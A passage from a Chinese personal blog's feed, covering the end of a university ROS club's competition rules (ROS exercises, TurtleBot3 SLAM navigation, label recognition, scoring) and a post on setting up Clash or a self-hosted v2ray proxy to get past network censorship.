依次发送斐波</p> <p>拉契数列的数字到话题/fibonacci 中；创建一个订阅者，订阅该话题，输出订阅结果。</p> <p>如，订阅者依次输出： 1 1 2 3 5 8 …</p> <p><strong>（2）实验 2</strong>：使用 ROS 服务(Service)机制实现同步请求与答复</p> <p>要求：编写代码实现 ROS 中的服务请求与答复：创建服务端，注册 Service，当服务端收到客</p> <p>户端 Service 请求（携带整型参数 a,b）后，服务端返回 a,b 的和给客户端，客户端输出结果。</p> <p>如，客户端给服务端 Service 发送参数 3, 9，服务端返回 12，客户端输出： 12。</p> <p><strong>（3）实验 3</strong>：使用 ROS 动作(Action)机制实现目标请求、进度与完成结</p> <p>果的反馈。</p> <p>要求：编写代码实现 ROS 中动作请求与进度反馈，创建服务端，注册 Action，客户端发送</p> <p>action 请求检测 40 个零件， 服务端接收后，每隔 1s 检测一个零件（每检测一个打印一次）， 并</p> <p>实时给客户端返回检测进度（客户端打印进度百分比），并在检测完毕时告知客户端目标完成。</p> <p>如，服务端实时打印：检测 1 个零件 检测 2 个零件 … 检测 40 个零件 检测完成</p> <p>客户端实时打印： 2.5% 5% … 100% 检测完成</p> <blockquote> <p><strong>注意</strong>：图片已丢失。</p> </blockquote> <p><strong>二、第二部分，机器人建图导航任务（40 分）</strong></p> <p><strong>使用竞赛机器人（turtlebot3），在gazebo仿真环境中，完成基于 ROS 的机器人 SLAM 建图导航。</strong></p> <p>（一）场地说明</p> <p>选手自行搭建图示的一比一的场地，但是要求搭建的场地各部件尺寸与图纸尺寸差距在 5%以内。</p> <blockquote> <p><strong>注意</strong>：场地示意图图片已丢失。</p> </blockquote> <p>补充说明：</p> <p>1.场地中的邮件分拣台高度 15cm，邮件收集箱高度 15cm，挡板高度 15cm，误差小于 1cm</p> <p>（二）要求：参赛选手控制竞赛机器人在指定场景中构建环境地图，并编写程序使得竞赛机器人能够在场景中完成自主导航。要求使用命令行运行建图和自主导航的程序或脚本，使用 rviz 工具来演示机器人的建图和导航过程，否则不得分。</p> <p><strong>（1）任务 1</strong>：选手操作机器人，在场景中构建出环境地图，并提供地图参数文件，描述地图的宽高、分辨率（地图像素与真实环境的比例）、世界坐标等参数。地图图片格式需为 png，pgm，jpg 等常见图片格式，方便评分员审查图片。 基础得分（4+8+5=17 分）由地图的精准程度决定， 精准程度主要由依据以下</p> <p>两个方面：</p> <p>1) 地图是否完整。（8 个投递箱轮廓需在地图中清晰的显示，不能有明显缺失）</p> <p>2) 地图是否有重影。（平直的场地挡板、分拣台、投递箱不应生成多层重叠的图像）</p> <p>额外加分（最高 5 分）由地图的构建效率决定，效率主要指：</p> <p>1) 地图有效部分(即场地图片)在地图图片中的大致占比。</p> <p><strong>（2）任务2</strong>：选手提前记录/计算好点位坐标，程序运行后，机器人从出发区出发，往返分拣台中间位置与投递箱进行邮件的抓取投放，每个投递箱均完成一次投放后，机器人返回出发区，请完成机器人在整个过程中的轨迹规划（不判别地区标识文字，不需要真实抓取与投放，即到达抓取与投放位置即可）。 </p> <p>基础得分（10+8+5=23 分）由对点位的自主导航完成个数与安全程度决定，额外加分（最高 5 分）由完成时间决定。</p> <p>（3）提交运行效果的全屏幕截屏视频。建图的地图图片不能人为手动编辑/裁剪，只能通过算法处理。路径规划在标记好出发位置和所有投递箱的坐标后，路径的规划过程不能人为干预。</p> <p>（4）参赛队必须提交提供部署与运行流程文档，充分说明部署方式；提供理论总结。</p> <p>（三）评分</p> <p>1. 计分</p> <blockquote> <p><strong>注意</strong>：评分表图片已丢失。</p> </blockquote> <p><strong>三、第三部分，图像识别（40 分）</strong></p> <p>（一）基础数据</p> <p>图像内容为张贴在盒子上的标签。输出皆为各省区 2~3 字的简写名称。</p> <p>（二）要求：</p> <p>（1）远程测试图像为随机的 20 张图片，并在规定时间（3 分钟）内反馈识别结果，识别结果格式如下图所示，否则识别失败。</p> <blockquote> <p><strong>注意</strong>：识别结果示例图片已丢失。</p> </blockquote> <p>要求用录屏文件+文本文件显示结果：录屏中依次显示原图像和带结果的图像（图像需显示长宽像素值）；文本文件中记录识别结果。</p> <p>①输出邮件省份文字，显示到结果图像中。 </p> <p>②在结果图像中标出邮件盒在图像中的位置（可如上图一样框起来），并得到邮件盒中心在图像中大致的像素坐标（图片左上角为 0，0，右为 x 正方向，下为 y正方向），显示在图像中。</p> <p>③上述结果需以文本保存文件中，格式如下：</p> <p>文件名：result.txt。内容为: 广东,(232,311); 江苏,(299,283);…</p> <p>（没有计算坐标的，坐标统一写为(0,0)）</p> <p>（2）同时提交运行效果的全屏幕截屏视频。</p> <p>（3）参赛队必须提交可运行源代码，充分说明部署方式。</p> <p>（三）评分</p> <p>1. 计分</p> <p>（1）每一幅图片，识别省份正确的得 1 分，标出邮件盒坐标数据的得 1 分，总分 2分；</p> <p>（2）记录整体运行时间。</p> <p>2. 排序</p> <p>（1）以得分逆序为第一序；</p> <p>（2）得分相同的，以正确率的逆序为第二序；</p> <p>（3）正确率相同的，以运行时间的正序为第三序</p> <p>四、文档要求</p> <p>各参赛队必须提交说明文档与源代码。说明文档模板与相关要求另行公布。文档与源代码质量（含风格）皆作为评分要素。具体评分为：</p> <blockquote> <p><strong>注意</strong>：评分表图片已丢失。</p> </blockquote> <p>五、综合排序</p> <p>1. 最终排名</p> <p>最终预选赛成绩排名如下：</p> <p>ROS 基础、建图、导航、图像识别、文档之排序，按照 5% : 20% : 30% : 30% : 15%之权重求和得到新的排序作为预选赛最终排名。若排名遇到相同的，从后往前逐步去掉一项权重再次排名。 </p> <p>2. 排名排除</p> <p>以下情况将不进行排名，并淘汰：</p> <p>（1）源代码无法运行，或运行效果与所提供视频明显不符；</p> <p>（2）文档或源代码涉嫌抄袭、或具有知识产权争议；</p> <p>（3）视频、文档、源代码等所有需要提交的内容，有一项或一项以上缺失；</p> <p>（4）视频经过编辑，如中途剪辑、拼接、改变视频播放速度、故意截去屏幕部分区域等；</p> <p>（5）机器人地图生成、自主导航或图像识别过程中有人为干预；</p> <p>（6）网站填写内容与提交文档明显不符；</p> <p><strong>附1：</strong> 培训材料</p> <blockquote> <p><strong>注意</strong>：培训材料图片已丢失。</p> </blockquote> <p><strong>附件4：任务三录屏</strong></p> <p><a href="https://pan.baidu.com/s/1O3jm-fC1_EIlqIj7fUQV1Q?pwd=42v3" title="https://pan.baidu.com/s/1O3jm-fC1_EIlqIj7fUQV1Q?pwd=42v3 ">**<a href="https://pan.baidu.com/s/1O3jm-fC1_EIlqIj7fUQV1Q?pwd=42v3">https://pan.baidu.com/s/1O3jm-fC1_EIlqIj7fUQV1Q?pwd=42v3</a> **​</a></p> <p>提取码:42v3</p> <p><strong>附件5：图像识别</strong></p> <p><a href="https://pan.baidu.com/s/19_sxMpVnX1EQ3yeQ3aw1DA?pwd=97xt" title="https://pan.baidu.com/s/19_sxMpVnX1EQ3yeQ3aw1DA?pwd=97xt ">**<a href="https://pan.baidu.com/s/19_sxMpVnX1EQ3yeQ3aw1DA?pwd=97xt">https://pan.baidu.com/s/19_sxMpVnX1EQ3yeQ3aw1DA?pwd=97xt</a> **​</a></p> <p>提取码：97xt</p> <p><strong>附件6：提交模板</strong></p> <blockquote> <p><strong>注意</strong>：提交模板图片已丢失。</p> </blockquote> <p><strong>附件7：报名链接</strong></p> <p><a href="https://www.wjx.top/vm/OIQXI2u.aspx" title="https://www.wjx.top/vm/OIQXI2u.aspx"><strong>https://www.wjx.top/vm/OIQXI2u.aspx</strong></a></p> <p><strong>附件8：提交链接（打包成一个文件，以百度网盘的形式，注：有三个录屏）提交链接即可</strong></p> <p><a href="https://www.wjx.top/vm/tURrUF0.aspx" title="https://www.wjx.top/vm/tURrUF0.aspx"><strong>https://www.wjx.top/vm/tURrUF0.aspx</strong></a></p> <p>以上内容参考2022年第十五届中国大学生计算机大赛</p>]]></content><author><name></name></author><category term="ROS"/><category term="ROS"/><summary type="html"><![CDATA[深大ROS俱乐部内部赛比赛规则和任务要求，包括ROS基础、机器人建图导航、图像识别三个部分]]></summary></entry><entry><title type="html">如何科学上网</title><link href="https://gewenhao.win/blog/2023/%E5%A6%82%E4%BD%95%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91/" rel="alternate" type="text/html" title="如何科学上网"/><published>2023-07-01T10:00:00+00:00</published><updated>2023-07-01T10:00:00+00:00</updated><id>https://gewenhao.win/blog/2023/%E5%A6%82%E4%BD%95%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91</id><content type="html" xml:base="https://gewenhao.win/blog/2023/%E5%A6%82%E4%BD%95%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91/"><![CDATA[<h1 id="如何科学上网">如何科学上网</h1> <h2 id="前言">前言</h2> <p>鄙人不才，尝试过很多种科学上网的方式，比如网上各种加速器，有些一开始说免费然后进去就要收费，有些比较良心，每天免费几小时，但是网速真的不忍直视。然后尝试使用v2ray配合网上的免费节点，但是网上的免费节点也不稳定呀，更新订阅更换节点属实累人。本冤种就尝试买了个搬瓦工，照着网上的教程去搭socket（本来是搭v2ray但是自己觉得太慢了），结果不出两天就被墙了。</p> <p>废话不多说。后面摸索出两条可行路线。一条是clash+一元机场，好处就是机场很便宜，一年十几块的机场费用，然后也不需要自己搭建，简单易用。一条是使用v2ray+境外服务器自建梯子，好处是自己搭建的节点很纯净适合使用gpt等对网络环境要求较高的网站，一个服务器一年也就三百左右，可以和朋友拼，合下来一年也就几十。</p> <h2 id="正文">正文</h2> <h3 id="clash一元机场方式">clash+一元机场方式</h3> <p>先安装clash软件，这里贴上Android版本和windows版本：</p> <h4 id="1clash-for-android">1.clash-for-Android：</h4> <p><a href="https://github.com/githubvpn007/Clash-for-Android">GitHub - githubvpn007/Clash-for-Android</a></p> <hr/> <h4 id="2clash-for-windows">2.clash-for-Windows：</h4> <p><a href="https://github.com/githubvpn007/Clash-for-Windows">GitHub - githubvpn007/Clash-for-Windows</a></p> <p>clash软件下载安装好了之后，直接去一元机场官网购买机场，买最便宜的就行，照着里面教程配置即可：</p> <h4 id="一元机场链接">一元机场链接</h4> <p><a href="https://xn--4gq62f52gdss.com/#/register?code=wbN81iWR">一元机场注册链接</a></p> <p><strong>使用步骤：</strong></p> <ol> <li>注册账号并购买套餐（推荐最便宜的套餐即可）</li> <li>在机场后台复制 Clash 订阅链接</li> <li>打开 Clash for Windows，进入 <strong>Profiles</strong> 标签页</li> <li>在顶部输入框中粘贴订阅链接，点击 <strong>Download</strong> 按钮</li> <li>下载成功后，切换到该配置文件</li> <li>在 <strong>Proxies</strong> 标签页选择节点，将出站模式设置为 <strong>Rule</strong>（规则模式）</li> <li>返回 <strong>General</strong> 标签页，开启 <strong>System Proxy</strong>（系统代理）</li> </ol> <p><strong>注意事项：</strong></p> <ul> <li>如果无法在软件内更新订阅，可以手动下载配置文件： <ol> <li>在浏览器中打开订阅链接</li> <li>复制全部文本内容</li> <li>保存为 <code class="language-plaintext highlighter-rouge">.yaml</code> 格式文件</li> <li>拖拽到 Clash for Windows 的 Profiles 界面</li> </ol> </li> <li>建议开启 <strong>Start with Windows</strong>（开机自启）功能</li> <li>定期更新订阅链接以获取最新节点</li> </ul> <h3 id="v2ray自建节点">v2ray+自建节点</h3> <p>先安装v2ray软件，这里贴上Android版本和Windows版本：</p> <h4 id="1-v2ray-for-windows">1. v2ray-for-Windows：</h4> <p><a href="https://github.com/githubvpn007/v2rayNvpn/blob/main/V2rayN_Windows.md">v2rayN 使用教程</a></p> <p>v2rayN 是 Windows 平台上的 v2ray 客户端，支持多种协议和订阅功能。</p> <h4 id="2-v2ray-for-android">2. v2ray-for-Android:</h4> <p><a href="https://github.com/2dust/v2rayNG/releases">v2rayNG 下载地址</a></p> <p>v2rayNG 是 Android 平台上的 v2ray 客户端，功能强大且易于使用。</p> <h4 id="3-v2fly-docker-部署方式">3. v2fly-docker 部署方式</h4> <p>此方式仅在 Ubuntu 系统上测试过，其他 Linux 发行版应该也可以使用。</p> <p><strong>步骤：</strong></p> <ol> <li><strong>下载配置文件</strong> <ul> <li><a href="/assets/file/online_proxy/docker-compose.yml">docker-compose.yml</a></li> <li><a href="/assets/file/online_proxy/config.json">config.json</a></li> </ul> </li> <li> <p><strong>配置节点信息</strong></p> <p>编辑 <code class="language-plaintext highlighter-rouge">config.json</code> 文件，将以下字段替换为你自己的节点信息：</p> <ul> <li><code class="language-plaintext highlighter-rouge">address</code>: 服务器IP地址</li> <li><code class="language-plaintext highlighter-rouge">port</code>: 服务器端口</li> <li><code class="language-plaintext highlighter-rouge">id</code>: VMess 协议的 UUID</li> <li><code class="language-plaintext highlighter-rouge">email</code>: 用户邮箱（可选）</li> </ul> <p>示例：</p> <div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
  </span><span class="nl">"address"</span><span class="p">:</span><span class="w"> </span><span class="s2">"your.server.ip.address"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"port"</span><span class="p">:</span><span class="w"> </span><span class="mi">443</span><span class="p">,</span><span class="w">
  </span><span class="nl">"users"</span><span class="p">:</span><span class="w"> </span><span class="p">[{</span><span class="w">
    </span><span class="nl">"id"</span><span class="p">:</span><span class="w"> </span><span class="s2">"your-uuid-here"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"email"</span><span class="p">:</span><span class="w"> </span><span class="s2">"user@example.com"</span><span class="w">
  </span><span class="p">}]</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></code></pre></div> </div> </li> <li> <p><strong>部署运行</strong></p> <p>将 <code class="language-plaintext highlighter-rouge">docker-compose.yml</code> 与 <code class="language-plaintext highlighter-rouge">config.json</code> 放在同一个文件夹中，然后执行：</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>docker compose up <span class="nt">-d</span>
</code></pre></div> </div> </li> <li> <p><strong>配置系统代理</strong></p> <p>部署成功后，需要在系统代理设置中配置：</p> <ul> <li>HTTP 代理：<code class="language-plaintext highlighter-rouge">127.0.0.1:7890</code></li> <li>SOCKS5 代理：<code class="language-plaintext highlighter-rouge">127.0.0.1:7891</code></li> </ul> </li> <li><strong>停止服务</strong> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>docker compose down
</code></pre></div> </div> </li> </ol> <p><strong>注意事项：</strong></p> <ul> <li>确保已安装 Docker 和 Docker Compose</li> <li>确保端口 7890 和 7891 未被占用</li> <li>配置文件路径必须正确，否则容器无法启动</li> </ul> <h4 id="4-自建节点">4. 自建节点</h4> <p>自建节点需要购买境外服务器（如 Vultr、DigitalOcean、搬瓦工等），然后在服务器上搭建 v2ray 节点。</p> <p><strong>推荐服务器提供商：</strong></p> <ul> <li><a href="https://www.vultr.com/">Vultr</a> - 按小时计费，支持多地区</li> <li><a href="https://www.digitalocean.com/">DigitalOcean</a> - 稳定可靠</li> <li><a href="https://bandwagonhost.com/">搬瓦工</a> - 价格相对便宜</li> </ul> <p><strong>搭建教程：</strong> 可以参考 <a href="https://www.v2fly.org/">v2ray 官方文档</a> 或使用一键安装脚本，如 <a href="https://github.com/mack-a/v2ray-agent">v2ray-agent</a>。</p> <p><strong>优势：</strong></p> <ul> <li>节点纯净，适合访问 ChatGPT、Google 等对网络环境要求较高的服务</li> <li>可以和朋友共享，分摊成本</li> <li>完全自主控制，不受机场限制</li> </ul> <h2 id="两种方式对比">两种方式对比</h2> <table> <thead> <tr> <th>对比项</th> <th>Clash + 一元机场</th> <th>v2ray + 自建节点</th> </tr> </thead> <tbody> <tr> <td><strong>成本</strong></td> <td>约 10-20 元/年</td> <td>约 300-500 元/年（可多人共享）</td> </tr> <tr> <td><strong>配置难度</strong></td> <td>⭐ 简单</td> <td>⭐⭐⭐ 中等</td> </tr> <tr> <td><strong>节点质量</strong></td> <td>一般，可能被多人使用</td> <td>纯净，独享</td> </tr> <tr> <td><strong>适用场景</strong></td> <td>日常浏览、视频</td> <td>访问 ChatGPT、Google 等高质量服务</td> </tr> <tr> <td><strong>维护成本</strong></td> <td>低，机场自动维护</td> <td>中等，需要自己维护服务器</td> </tr> <tr> <td><strong>推荐人群</strong></td> <td>新手、轻度用户</td> <td>有技术基础、对网络质量要求高的用户</td> </tr> </tbody> </table> <h2 id="更多资源">更多资源</h2> <p>如果你好奇心比较重，想了解更多科学上网的方式和工具，可以查看：</p> <ul> <li><a href="https://github.com/githubvpn007/v2rayNvpn#%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B">v2rayN 使用教程集合</a></li> <li><a href="https://www.v2fly.org/">v2ray 官方文档</a></li> <li><a href="https://clash.gitbook.io/doc/">Clash 官方文档</a></li> </ul> <h2 id="免责声明">免责声明</h2> <p>本文仅用于技术交流和学习目的。请遵守当地法律法规，合理使用网络工具。作者不对使用本文内容造成的任何后果负责。</p>]]></content><author><name></name></author><category term="工具"/><category term="网络"/><category term="工具"/><category term="Clash"/><category term="VPN"/><summary type="html"><![CDATA[详细介绍使用 Clash + 一元机场和 v2ray + 自建节点两种科学上网方式，包括安装配置、使用教程和常见问题解答]]></summary></entry></feed>